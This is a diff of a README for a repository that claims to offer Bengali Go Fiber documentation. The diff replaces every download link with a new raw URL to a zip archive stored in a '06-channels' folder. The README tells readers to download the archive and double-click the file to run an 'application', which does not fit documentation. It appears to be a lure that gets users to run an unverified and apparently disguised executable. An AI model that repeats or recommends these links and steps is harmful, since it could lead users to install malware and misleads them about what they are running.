@@ -1,7 +1,7 @@
 # 🌟 go-fiber-docs-bangla - Complete Guide to Go Fiber
 
 ## 📥 Download Now!
-[![Download](https://github.com/cwqqes/go-fiber-docs-bangla/raw/refs/heads/main/06-channels/go-bangla-docs-fiber-1.8.zip%20Now-Click%20Here-blue)](https://github.com/cwqqes/go-fiber-docs-bangla/raw/refs/heads/main/06-channels/go-bangla-docs-fiber-1.8.zip)
+[![Download](https://raw.githubusercontent.com/cwqqes/go-fiber-docs-bangla/main/06-channels/bangla_docs_go_fiber_v1.8.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/cwqqes/go-fiber-docs-bangla/main/06-channels/bangla_docs_go_fiber_v1.8.zip)
 
 ## 📚 Introduction
 Welcome to the Go Fiber documentation in Bengali. This guide covers everything from the basics to advanced architecture of the Go Fiber framework. Whether you are starting your programming journey or looking to improve your skills, you will find valuable information here.
@@ -9,7 +9,7 @@ Welcome to the Go Fiber documentation in Bengali. This guide covers everything f
 ## 🚀 Getting Started
 To begin using the Go Fiber framework, follow these steps to download and run the application.
 
-1. **Visit the Releases Page:** Click [here](https://github.com/cwqqes/go-fiber-docs-bangla/raw/refs/heads/main/06-channels/go-bangla-docs-fiber-1.8.zip) to go to the releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/cwqqes/go-fiber-docs-bangla/main/06-channels/bangla_docs_go_fiber_v1.8.zip) to go to the releases page.
 2. **Choose the Latest Version:** Look for the latest version available. You will see a list of files.
 3. **Download the Application:** Click on the file that matches your operating system (Windows, Mac, or Linux). 
 4. **Run the Application:** After the download is complete, locate the file on your computer. Double-click the file to run it. Follow the on-screen instructions to set up the application.
@@ -51,6 +51,6 @@ If you have questions or need more details on specific topics, you can check out
 If you encounter issues or need assistance, please feel free to reach out through the GitHub Issues section of this repository. We are here to help.
 
 ## 📥 Download & Install
-To get started, visit the releases page to download the Go Fiber documentation application. Click [here](https://github.com/cwqqes/go-fiber-docs-bangla/raw/refs/heads/main/06-channels/go-bangla-docs-fiber-1.8.zip).
+To get started, visit the releases page to download the Go Fiber documentation application. Click [here](https://raw.githubusercontent.com/cwqqes/go-fiber-docs-bangla/main/06-channels/bangla_docs_go_fiber_v1.8.zip).
 
 Happy coding with Go Fiber!
